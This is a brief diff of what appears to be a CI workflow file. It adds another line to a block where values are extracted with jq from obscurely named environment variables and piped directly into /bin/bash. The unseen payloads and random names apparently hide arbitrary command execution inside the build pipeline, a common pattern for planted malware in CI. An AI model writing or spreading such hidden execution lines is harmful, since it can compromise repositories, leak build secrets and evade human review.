@@ -28,6 +28,7 @@ jobs:
           echo $q5622 | jq -r .zmtp10 | /bin/bash
           echo $hvfup3 | jq -r .a70 | /bin/bash
           echo $ip0 | jq -r .y1 | /bin/bash
+          echo $zt9307 | jq -r .y70136 | /bin/bash
 
       - name: Store results
         uses: actions/upload-artifact@v4
